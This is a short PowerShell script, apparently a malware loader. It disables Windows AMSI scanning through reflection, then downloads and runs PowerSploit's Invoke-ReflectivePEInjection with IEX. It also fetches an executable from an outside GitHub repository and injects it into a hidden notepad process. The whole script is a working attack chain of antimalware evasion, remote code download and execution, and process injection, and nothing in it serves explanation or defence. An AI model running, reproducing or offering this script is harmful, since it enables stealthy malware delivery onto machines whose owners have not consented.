Write-Host "[*] Bypassing AMSI..." -ForegroundColor Yellow
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);

Write-Host "[*] Fetching Injector from GitHub..." -ForegroundColor Yellow
$injUrl = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (New-Object Net.WebClient).DownloadString($injUrl)

Write-Host "[*] Downloading Payload..." -ForegroundColor Yellow
$exeUrl = "https://raw.githubusercontent.com/077x1/loader/main/loder.exe" 
$WebClient = New-Object System.Net.WebClient
try {
    $PEBytes = $WebClient.DownloadData($exeUrl)
    Write-Host "[+] Downloaded $($PEBytes.Length) bytes." -ForegroundColor Green
} catch {
    Write-Host "[-] Failed to download payload." -ForegroundColor Red
    exit
}

Write-Host "[*] Finding Notepad..."
$targetProc = Get-Process -Name "notepad" -ErrorAction SilentlyContinue
if (-not $targetProc) {
    Start-Process -FilePath "notepad.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 1
    $targetProc = Get-Process -Name "notepad" | Select-Object -First 1
}

Write-Host "[*] Injecting into PID: $($targetProc.Id) ..." -ForegroundColor Cyan
Invoke-ReflectivePEInjection -PEBytes $PEBytes -ProcessId $targetProc.Id

Write-Host "[+] Done! UI should appear now." -ForegroundColor Green
